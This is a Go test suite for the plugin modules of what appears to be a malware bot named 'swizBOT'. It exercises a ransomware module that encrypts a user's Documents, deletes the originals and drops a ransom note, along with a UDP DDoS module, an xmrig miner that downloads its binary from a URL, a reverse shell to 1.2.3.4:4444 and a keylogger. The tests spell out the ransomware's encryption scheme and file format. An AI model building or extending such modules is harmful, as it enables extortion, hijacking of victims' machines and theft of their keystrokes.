package plugins

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/binary"
	"encoding/pem"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
)

func aesNew(key []byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}

func ecdsaGenerate() (*ecdsa.PrivateKey, error) {
	return ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
}

func testKey(t *testing.T) (*rsa.PrivateKey, string) {
	t.Helper()
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatal(err)
	}
	der, err := x509.MarshalPKIXPublicKey(&key.PublicKey)
	if err != nil {
		t.Fatal(err)
	}
	pemBytes := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der})
	return key, string(pemBytes)
}

func TestRansomwareRoundTrip(t *testing.T) {
	priv, pubPEM := testKey(t)
	home := t.TempDir()
	docs := filepath.Join(home, "Documents")
	os.MkdirAll(docs, 0o755)
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", "")

	secret := []byte("church of malware pays the bills")
	os.WriteFile(filepath.Join(docs, "note.txt"), secret, 0o644)
	os.WriteFile(filepath.Join(docs, "skip.me"), []byte("x"), 0o644) // not a target ext

	rw, err := NewRansomware(pubPEM)
	if err != nil {
		t.Fatal(err)
	}
	if err := rw.Start(); err != nil {
		t.Fatal(err)
	}
	enc, skip := rw.Stats()
	if enc != 1 {
		t.Fatalf("encrypted = %d, want 1", enc)
	}
	if skip != 0 {
		t.Fatalf("skipped = %d, want 0 on first pass", skip)
	}

	// second pass must be idempotent: the .swiz artifact is skipped
	if err := rw.Start(); err == nil {
		t.Fatal("expected error on second pass (nothing left to encrypt)")
	}
	_, skip = rw.Stats()
	if skip < 1 {
		t.Fatalf("expected .swiz artifact to be skipped on second pass, skip=%d", skip)
	}

	encPath := filepath.Join(docs, "note.txt.swiz")
	data, err := os.ReadFile(encPath)
	if err != nil {
		t.Fatal(err)
	}
	if len(data) < 8 || string(data[:8]) != magic {
		t.Fatal("missing magic header")
	}
	keyLen := int(binary.BigEndian.Uint16(data[8:10]))
	encKey := data[10 : 10+keyLen]
	rest := data[10+keyLen:]
	nonce := rest[:12]
	ct := rest[12:]

	aesKey, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, encKey, []byte("swizBOT"))
	if err != nil {
		t.Fatalf("decrypt wrapped key: %v", err)
	}
	if _, err := os.Stat(filepath.Join(docs, "note.txt")); !os.IsNotExist(err) {
		t.Fatal("original file was not removed")
	}
	if _, err := os.Stat(filepath.Join(docs, "README_SWIZBOT.txt")); err != nil {
		t.Fatal("readme not dropped:", err)
	}

	// decrypt with the recovered key
	block, err := aesNew(aesKey)
	if err != nil {
		t.Fatal(err)
	}
	plain, err := block.Open(nil, nonce, ct, nil)
	if err != nil {
		t.Fatalf("gcm open: %v", err)
	}
	if string(plain) != string(secret) {
		t.Fatal("round-trip mismatch")
	}
}

func TestRansomwareRejectsBadKey(t *testing.T) {
	if _, err := NewRansomware("not a pem"); err == nil {
		t.Fatal("expected error for garbage PEM")
	}
	if _, err := NewRansomware(""); err == nil {
		t.Fatal("expected error for empty PEM")
	}
}

func TestRansomwareRejectsECKey(t *testing.T) {
	// ECDSA keys must be refused: module is RSA-only.
	ec, err := ecdsaGenerate()
	if err != nil {
		t.Fatal(err)
	}
	der, _ := x509.MarshalPKIXPublicKey(&ec.PublicKey)
	block := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der})
	if _, err := NewRansomware(string(block)); err == nil {
		t.Fatal("expected error for non-RSA key")
	}
}

func TestDDoSValidate(t *testing.T) {
	cases := []struct {
		target, method string
		ok             bool
	}{
		{"1.2.3.4:80", "udp", true},
		{"example.com:443", "https", false},
		{"1.2.3.4", "udp", false}, // no port
		{"1.2.3.4:80", "syn", false},
	}
	for _, c := range cases {
		d := NewDDoS(c.target, c.method)
		err := d.Validate()
		if (err == nil) != c.ok {
			t.Errorf("Validate(%q,%q) err=%v want ok=%v", c.target, c.method, err, c.ok)
		}
	}
}

func TestMinerArgsAndResolve(t *testing.T) {
	m := NewMiner("pool.example:3333", "wallet123", 4, "")
	if got := m.buildArgs(); len(got) != 7 {
		t.Fatalf("args = %v", got)
	}
	// no source and no xmrig on PATH -> resolve fails cleanly
	m = NewMiner("p", "w", 2, "")
	if err := m.Resolve(); err == nil {
		t.Fatal("expected resolve error without source")
	}

	// local file source
	bin := filepath.Join(t.TempDir(), "xmrig")
	os.WriteFile(bin, []byte("#!/bin/sh\n"), 0o755)
	m = NewMiner("p", "w", 2, bin)
	if err := m.Resolve(); err != nil {
		t.Fatal(err)
	}

	// URL source via httptest
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("binary"))
	}))
	defer srv.Close()
	m = NewMiner("p", "w", 2, srv.URL+"/xmrig")
	if err := m.Resolve(); err != nil {
		t.Fatal(err)
	}
	if m.path == "" {
		t.Fatal("no path resolved")
	}
}

func TestReverseShellValidate(t *testing.T) {
	if err := NewReverseShell("", 4444).Validate(); err == nil {
		t.Error("expected error for empty host")
	}
	if err := NewReverseShell("1.2.3.4", 99999).Validate(); err == nil {
		t.Error("expected error for bad port")
	}
	if err := NewReverseShell("1.2.3.4", 4444).Validate(); err != nil {
		t.Error(err)
	}
}

func TestKeyName(t *testing.T) {
	cases := []struct {
		vk      int
		shifted bool
		want    string
	}{
		{0x41, false, "a"},
		{0x41, true, "A"},
		{0x30, false, "0"},
		{0x30, true, ")"},
		{0x20, false, " "},
		{0x0D, false, "[ENTER]\n"},
		{0x70, false, "[F1]"},
		{0x08, false, "[BACKSPACE]"},
	}
	for _, c := range cases {
		if got := KeyName(c.vk, c.shifted); got != c.want {
			t.Errorf("KeyName(%#x,%v) = %q want %q", c.vk, c.shifted, got, c.want)
		}
	}
}
